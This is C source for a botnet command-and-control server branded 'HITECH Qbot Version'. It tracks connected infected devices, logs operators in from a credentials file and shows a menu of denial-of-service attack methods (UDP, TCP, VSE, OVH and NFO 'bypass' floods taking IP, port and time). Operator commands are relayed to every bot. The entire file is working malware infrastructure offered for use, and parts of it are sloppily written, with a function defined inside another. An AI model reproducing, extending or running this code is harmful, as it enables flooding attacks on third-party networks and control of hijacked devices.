#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#define MAXFDS 1000000


struct login_info {
	char username[75];
	char password[75];
};
static struct login_info accounts[125];
struct clientdata_t {
        uint32_t ip;
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
} managements[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int scannerreport;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
	int total = 0, got = 1;
	while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
	return got;
}
void trim(char *str) {
	int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd) {
	int flags, s;
	flags = fcntl (sfd, F_GETFL, 0);
	if (flags == -1) {
		perror ("fcntl");
		return -1;
	}
	flags |= O_NONBLOCK;
	s = fcntl (sfd, F_SETFL, flags);
    if (s == -1) {
		perror ("fcntl");
		return -1;
	}
	return 0;
}
static int create_and_bind (char *port) {
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int s, sfd;
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo (NULL, port, &hints, &result);
    if (s != 0) {
		fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
		return -1;
	}
	for (rp = result; rp != NULL; rp = rp->ai_next) {
		sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
		if (sfd == -1) continue;
		int yes = 1;
		if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
		s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
		if (s == 0) {
			break;
		}
		close (sfd);
	}
	if (rp == NULL) {
		fprintf (stderr, "Could not bind\n");
		return -1;
	}
	freeaddrinfo (result);
	return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected)) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[0;34m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
void *BotEventLoop(void *useless) {
	struct epoll_event event;
	struct epoll_event *events;
	int s;
    events = calloc (MAXFDS, sizeof event);
    while (1) {
		int n, i;
		n = epoll_wait (epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++) {
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
				clients[events[i].data.fd].connected = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd) {
               while (1) {
				struct sockaddr in_addr;
                socklen_t in_len;
                int infd, ipIndex;

                in_len = sizeof in_addr;
                infd = accept (listenFD, &in_addr, &in_len);
				if (infd == -1) {
					if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                    else {
						perror ("accept");
						break;
						 }
				}

				clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
				int dup = 0;
				for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
					if(!clients[ipIndex].connected || ipIndex == infd) continue;
					if(clients[ipIndex].ip == clients[infd].ip) {
						dup = 1;
						break;
					}}
				s = make_socket_non_blocking (infd);
				if (s == -1) { close(infd); break; }
				event.data.fd = infd;
				event.events = EPOLLIN | EPOLLET;
				s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
				if (s == -1) {
					perror ("epoll_ctl");
					close(infd);
					break;
				}
				clients[infd].connected = 1;
			}
			continue;
		}
		else {
			int datafd = events[i].data.fd;
			struct clientdata_t *client = &(clients[datafd]);
			int done = 0;
            client->connected = 1;
			while (1) {
				ssize_t count;
				char buf[2048];
				memset(buf, 0, sizeof buf);
				while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
					if(strstr(buf, "\n") == NULL) { done = 1; break; }
					trim(buf);
					if(strcmp(buf, "PING") == 0) {
						if(send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
						continue;
					}
					if(strstr(buf, "PROBING") == buf) {
						char *line = strstr(buf, "PROBING");
						scannerreport = 1;
						continue;
					}
					if(strstr(buf, "REMOVING PROBE") == buf) {
						char *line = strstr(buf, "REMOVING PROBE");
						scannerreport = 0;
						continue;
					}
					if(strcmp(buf, "PONG") == 0) {
						continue;
					}
					printf("%s\n", buf);
				}
				if (count == -1) {
					if (errno != EAGAIN) {
						done = 1;
					}
					break;
				}
				else if (count == 0) {
					done = 1;
					break;
				}
			if (done) {
				client->connected = 0;
				close(datafd);
}}}}}}
unsigned int BotsConnected() {
	int i = 0, total = 0;
	for(i = 0; i < MAXFDS; i++) {
		if(!clients[i].connected) continue;
		total++;
	}
	return total;
}
int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("login.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);
    if(find_result == 0)return 0;
    return find_line;
}
void client_addr(struct sockaddr_in addr) 
{
	printf("%d %d %d %d \e[38;5;129m-\x1b[0m\n",
	addr.sin_addr.s_addr & 0xFF,
	(addr.sin_addr.s_addr & 0xFF00)>>8,
	(addr.sin_addr.s_addr & 0xFF0000)>>16,
	(addr.sin_addr.s_addr & 0xFF000000)>>24);
}
void *BotWorker(void *sock) {
	int datafd = (int)sock;
	int find_line;
	OperatorsConnected++;
    pthread_t title;
    char buf[2048];
	char* username;
	char* password;
	memset(buf, 0, sizeof buf);
	char botnet[2048];
	memset(botnet, 0, 2048);
	char botcount [2048];
	memset(botcount, 0, 2048);
	char statuscount [2048];
	memset(statuscount, 0, 2048);

	FILE *fp;
	int i=0;
	int c;
	fp=fopen("login.txt", "r");
	while(!feof(fp)) {
		c=fgetc(fp);
		++i;
	}
    int j=0;
    rewind(fp);
    while(j!=i-1) {
		fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
		++j;
	}	
	
		char clearscreen [2048];
		memset(clearscreen, 0, 2048);
		sprintf(clearscreen, "\033[1A");
		char user [5000];	
		
        sprintf(user, "\e[36mUsername\e[38;5;129m:\e[36m ");
		
		if(send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
		char* nickstring;
		sprintf(accounts[find_line].username, buf);
        nickstring = ("%s", buf);
        find_line = Find_Login(nickstring);
        if(strcmp(nickstring, accounts[find_line].username) == 0){
		char password [5000];
		if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
        sprintf(password, "\e[36mPassword\e[38;5;129m:\e[36m ", accounts[find_line].username);
		if(send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, datafd) < 1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
		
        goto Banner;
        }
void *TitleWriter(void *sock) {
	int datafd = (int)sock;
    char string[2048];
    while(1) {
		memset(string, 0, 2048);
        sprintf(string, "%c]0; %d Devices |HITECH %c", '\033', BotsConnected(), '\007');
        if(send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
		sleep(2);
		}
}		
        failed:
		if(send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        goto end;
		Banner:
		pthread_create(&title, NULL, &TitleWriter, sock);
		char ascii_banner_line1   [5000];
		char ascii_banner_line2   [5000];
		char ascii_banner_line3   [5000];       
		char ascii_banner_line19   [5000];      


		sprintf(ascii_banner_line1,   "\033[2J\033[1;1H");
		sprintf(ascii_banner_line2,   "\r\n");                                                                                                                                                                                                                                                                                                      
		sprintf(ascii_banner_line3,   " \e[36m╔════════════════════════════════════╗\r\n \e[36m║  \e[38;5;129mHITECH  \e[36m-  \e[38;5;129mMain Menu \e[36m- \e[38;5;129mWelcome    \e[36m║\r\n \e[36m╠════════════════════════════════════╣\r\n \e[36m║       \e[38;5;129mWelcome to HITECH            \e[36m╠════╗\r\n \e[36m║       \e[38;5;129m   Stay Sippin  \e[36m.            \e[36m║    ║\r\n \e[36m╚═══════════════╦════════════════════╝    ╚═══════════╗\r\n \e[36m                ║                                     ║\r\n \e[36m                ║                                     ║\r\n \e[36m╔═══════════════╩══════════════════╗                  ║\r\n \e[36m║  \e[38;5;129mHITECH  \e[36m- \e[38;5;129mCommand List \e[36m- \e[38;5;129mCmds   \e[36m║ ╔════════════════╩═══════════════════════╗\r\n \e[36m╠══════════════════════════════════╣ ║          \e[38;5;129mOS\e[36m:\e[38;5;129mCentOS \e[36m[\e[38;5;129m6\e[36m] - [\e[38;5;129m7\e[36m]        \e[36m   ║\r\n \e[36m║  \e[38;5;129m?    \e[36m- \e[38;5;129mInfo & Attack Methods    \e[36m║ ║         \e[38;5;129mHosted By udpmethod . \e[36m         ║\r\n \e[36m║  \e[38;5;129mHelp \e[36m- \e[38;5;129mInfo & Attack Methods    \e[36m╠═╣         \e[38;5;129m HITECH Qbot Version  \e[36m         ║\r\n \e[36m║  \e[38;5;129mcls  \e[36m- \e[38;5;129mClears screen            \e[36m║ ║         \e[38;5;129m   ~The Key Is Power~   \e[36m       ║\r\n \e[36m╚══════════════════════════════════╝ ╚════════════════════════════════════════╝\r\n"); 
		sprintf(ascii_banner_line19,  "\r\n"); 


 
		if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
		if(send(datafd, ascii_banner_line19, strlen(ascii_banner_line19), MSG_NOSIGNAL) == -1) goto end;
		


		while(1) {
		char input [5000];
        sprintf(input, "\e[36m[\e[38;5;129m%s\e[36m\e[36m@\e[36m\e[38;5;129mHITECH\e[36m]\e[38;5;129m~ \e[36m", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &TitleWriter, sock);
        managements[datafd].connected = 1;

		while(fdgets(buf, sizeof buf, datafd) > 0) {   
				if (strncmp(buf, "HELP", 4) == 0 || strncmp(buf, "help", 4) == 0 || strncmp(buf, "?", 4) == 0) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char ls1  [5000];
				char ls2  [5000];
				char ls3  [5000];
				char ls4  [5000];
				char ls5  [5000];
				char ls6  [5000];
				char ls7  [5000];
				char ls8  [5000];
				char ls9  [5000];
				char ls10 [5000];
				char ls11 [5000];
				char ls12 [5000];
				char ls13 [5000];
				char ls14 [5000];
				char ls15 [5000];
				char ls16 [5000];
				char ls17 [5000];
				char ls18 [5000];
				char ls19 [5000];
				char ls20 [5000];
				char ls21 [5000];
				char ls22 [5000];
			        char ls23 [5000];
				


                sprintf(ls23, "\e[36m\r\n");
				sprintf(ls1, "\e[36m╔══════════════════════════════════════════╗\r\n");
				sprintf(ls2, "\e[36m║              Layer4 Methods              ║\r\n");
				sprintf(ls3, "\e[36m╠══════════════════════════════════════════╣\r\n");
				sprintf(ls4, "\e[36m║\e[38;5;129m!* UDPH [IP] [PORT] [TIME]                \e[36m║\r\n");
				sprintf(ls5, "\e[36m║\e[38;5;129m!* STD [IP] [PORT] [TIME]                 \e[36m║\r\n");
				sprintf(ls6, "\e[36m║\e[38;5;129m!* TCP [IP] [PORT] [TIME] 32 all 0 10     \e[36m║\r\n");
			        sprintf(ls7, "\e[36m║\e[38;5;129m!* VSE [IP] [PORT] [TIME] 32 1024 10      \e[36m║\r\n");
				sprintf(ls8, "\e[36m╚══════════════════════════════╦═══════════╩══════════════════╗\r\n");
				sprintf(ls9, "\e[38;5;129mStatus\e[36m: \e[38;5;129mPrivate                \e[36m║        Bypass Methods        \e[36m║\r\n");
				sprintf(ls10, "\e[38;5;129mBypass\e[36m: \e[38;5;129mSmacking               \e[36m╠══════════════════════════════╣\r\n");
				sprintf(ls12, "\e[38;5;129mMaker\e[36m: \e[38;5;129mudpmethod               \e[36m║\e[38;5;129m!* HEX      [IP] [PORT] [TIME]\e[36m║\r\n");
				sprintf(ls13, "\e[38;5;129mPartner\e[36m: \e[38;5;129mEdo                   \e[36m║\e[38;5;129m!* NFO      [IP] [PORT] [TIME]\e[36m║\r\n");
				sprintf(ls14, "\e[38;5;129mDev\e[36m: \e[38;5;129mUdpmethod                 \e[36m║\e[38;5;129m!* OVH      [IP] [PORT] [TIME]\e[36m║\r\n");
				sprintf(ls15, "\e[38;5;129mMax \e[38;5;129mTime\e[36m: \e[38;5;129m150                  \e[36m║\e[38;5;129m!* UDPHEX   [IP] [PORT] [TIME]\e[36m║\r\n");
				sprintf(ls16, "\e[36m╔══════════════════════════════╩══╦═══════════════════════════╝\r\n");
			        sprintf(ls17, "\e[36m║       Private Methods           ║\r\n");
				sprintf(ls18, "\e[36m╠═════════════════════════════════╣\r\n");
			        sprintf(ls19, "\e[36m║\e[38;5;129m!* FN [IP] [PORT] [TIME]         \e[36m║\r\n");
				sprintf(ls20, "\e[36m║\e[38;5;129m!* R6 [IP] [PORT] [TIME]         \e[36m║\r\n");
				sprintf(ls21, "\e[36m║\e[38;5;129m!* UDP [IP] [PORT] [TIME] 1024   \e[36m║\r\n");
				sprintf(ls22, "\e[36m╚═════════════════════════════════╝\r\n");

				


				
				if(send(datafd, ls1,  strlen(ls1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls2,  strlen(ls2),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls3,  strlen(ls3),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls4,  strlen(ls4),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls5,  strlen(ls5),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls6,  strlen(ls6),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls7,  strlen(ls7),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls8,  strlen(ls8),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls9,  strlen(ls9),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls10,  strlen(ls10),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls11,  strlen(ls11),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls12,  strlen(ls12),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls13,  strlen(ls13),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls14,  strlen(ls14),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls15,  strlen(ls15),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls16,  strlen(ls16),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls17,  strlen(ls17),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls18,  strlen(ls18),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls19,  strlen(ls19),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls20,  strlen(ls20),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls21,  strlen(ls21),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ls22,  strlen(ls22),	MSG_NOSIGNAL) == -1) goto end;
				
				

				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[36m[\e[38;5;129m%s\e[36m\e[36m@\e[36m\e[38;5;129mHITECH\e[36m]\e[38;5;129m~ \e[36m", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}
				if (strncmp(buf, "BOTS", 4) == 0 || strncmp(buf, "bots", 4) == 0 || strncmp(buf, "botcount", 4) == 0) {
				pthread_create(&title, NULL, &TitleWriter, sock);
				char bot_count1  [800];
				char bot_count2  [800];
				

				sprintf(bot_count1,  "\e[36mTotal Devices\x1b[0m\x1b[30m:\x1b[0m \e[38;5;129m%d\x1b[0m\r\n", BotsConnected());
				sprintf(bot_count2,  "\e[36mConnected Users\x1b[0m\x1b[30m:\x1b[0m \e[38;5;129m%d\x1b[0m\r\n", OperatorsConnected);
				
				
				if(send(datafd, bot_count1,  strlen(bot_count1),	MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, bot_count2,  strlen(bot_count2),	MSG_NOSIGNAL) == -1) goto end;
				

				pthread_create(&title, NULL, &TitleWriter, sock);
		char input [5000];
        sprintf(input, "\e[36m[\e[38;5;129m%s\e[36m\e[36m@\e[36m\e[38;5;129mHITECH\e[36m]\e[38;5;129m~ \e[36m", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				continue;
 		}				
			if (strncmp(buf, "CLEAR", 5) == 0 || strncmp(buf, "clear", 5) == 0 || strncmp(buf, "cls", 3) == 0 || strncmp(buf, "CLS", 3) == 0) {
				char clearscreen [2048];
				memset(clearscreen, 0, 2048);
				sprintf(clearscreen, "\033[2J\033[1;1H");
				if(send(datafd, clearscreen,   		strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
				if(send(datafd, ascii_banner_line19, strlen(ascii_banner_line19), MSG_NOSIGNAL) == -1) goto end;
				
				
				while(1) {
		char input [5000];
        sprintf(input, "\e[36m[\e[38;5;129m%s\e[36m\e[36m@\e[36m\e[38;5;129mHITECH\e[36m]\e[38;5;129m~ \e[36m", accounts[find_line].username);
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				break;
				}
				continue;
			}
            trim(buf);
			char input [5000];
        	sprintf(input, "\e[36m[\e[38;5;129m%s\e[36m\e[36m@\e[36m\e[38;5;129mHITECH\e[36m]\e[38;5;129m~ \e[36m", accounts[find_line].username);;
			if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
            if(strlen(buf) == 0) continue;
            printf("\e[38;5;129m%s\e[36m ~ ' \e[38;5;129m%s \e[36m'\x1b[0m\n",accounts[find_line].username, buf);

			FILE *LogFile;
            LogFile = fopen("Client.file", "a");
			time_t now;
			struct tm *gmt;
			char formatted_gmt [50];
			char lcltime[50];
			now = time(NULL);
			gmt = gmtime(&now);
			strftime ( formatted_gmt, sizeof(formatted_gmt), "%I:%M %p", gmt );
            fprintf(LogFile, "%s sent ' %s ' at %s\n", accounts[find_line].username, buf, formatted_gmt);
            fclose(LogFile);			
            broadcast(buf, datafd, accounts[find_line].username);
            memset(buf, 0, 2048);
        }

		end:
		managements[datafd].connected = 0;
		close(datafd);
		OperatorsConnected--;
}
void *BotListener(int port) {
	int sockfd, newsockfd;
	socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    while(1) {
		printf("\e[38;5;129m- \e[36mUser Connected :  ");
		client_addr(cli_addr);
		FILE *logFile;
		logFile = fopen("IP.Log", "a");
		fprintf(logFile, "- Client Logged With Ip:  - %d %d %d %d - \n", cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
		fclose(logFile);
		newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
}}
int main (int argc, char *argv[], void *sock) {
        signal(SIGPIPE, SIG_IGN);
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
			exit (EXIT_FAILURE);
        }
		port = atoi(argv[3]);
		printf("\e[38;5;129mScreen Is A Success\x1b[0m\r\n");
		printf("\e[36mDEV:UDP - OWNER: UDP - PARTNER: NONE\x1b[0m\r\n");
		printf(" \r\n");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "ZERO");
			sleep(15);
        }
        close (listenFD);
        return EXIT_SUCCESS;
};